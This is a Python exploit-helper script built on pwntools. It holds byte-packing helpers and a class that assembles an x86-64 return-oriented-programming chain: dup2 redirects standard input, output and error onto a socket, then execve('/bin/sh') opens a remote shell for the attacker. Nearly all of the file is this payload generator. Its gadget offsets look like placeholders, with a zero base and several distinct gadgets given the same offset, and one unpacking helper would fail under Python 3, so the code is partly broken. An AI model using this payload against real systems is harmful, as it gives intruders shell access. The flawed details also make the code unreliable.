#! /usr/bin/python3
import struct
from pwn import *
import time
import sys

_appBase = 0x0

# From docs.python.org/2/library/struct.html
# struct.pack syntax:
#   char    byte order      size        align
#   @       native          native      native
#   =       native          standard    none
#   <       little-endian   standard    none
#   >       big-endian      standard    none
#   !       network         standard    none
#           (big-endian)

# 1 byte / 8 bits
def b(v):
    return struct.pack("<B", v)

# 2 bytes / 16 bits
def w(v):
    return struct.pack("<H", v)

# 4 bytes / 32 bits
def d(v):
    return struct.pack("<I", v)

# 8 bytes / 64 bits
def q(v):
    return struct.pack("<Q", v)

def ub(v):
    return struct.unpack("<B", v[0])[0]

def uw(v):
    return struct.unpack("<H", v[:2])[0]

def ud(v):
    return struct.unpack("<I", v[:4])[0]

def uq(v):
    return struct.unpack("<Q", v[:8])[0]

# ===========================================

class PwnGen:

    appBase = 0x0

    def __init__(self, baseAddr):
        self.appBase = baseAddr

    def set_rdi(self, rdi):
        # 0x3
        # pop rdi; ret;
        return q(self.appBase + 0x3) + q(rdi)

    def set_rsi(self, rsi, r15=0x0):
        # 0x1
        # pop rsi; pop r15; ret;
        return q(self.appBase + 0x1) + q(rsi) + q(r15)

    def set_rdx(self, rdx):
        # 0x3    pop rdx; ret;
        return q(self.appBase + 0x3) + q(rdx)

    def set_rax(self, rax):
        # 0x1    pop rax; ret;
        return q(self.appBase + 0x1) + q(rax)

    def syscall(self):
        # 0x5    syscall; ret;
        return q(self.appBase + 0x5)
    
    def call_dup2(self, fd, fd2):
        dup = self.set_rax(0x21)
        dup += self.set_rdi(fd)
        dup += self.set_rsi(fd2)
        dup += self.syscall()
        return dup

    def p_pprint(self, p):
        pp = ""
        for h in p:
            pp += '\\x{:02x}'.format(h)
        print(pp)

    def get_payload(self, socketFD, binshAddr):
       
        p = self.call_dup2(socketFD, 0x0)
        p += self.call_dup2(socketFD, 0x1)
        p += self.call_dup2(socketFD, 0x2)

        # execve("/bin/sh", null, null)
        p += self.set_rax(0x3b)
        p += self.set_rdi(binshAddr)
        p += self.set_rsi(0x0)
        p += self.set_rdx(0x0)
        p += self.syscall()

        return p







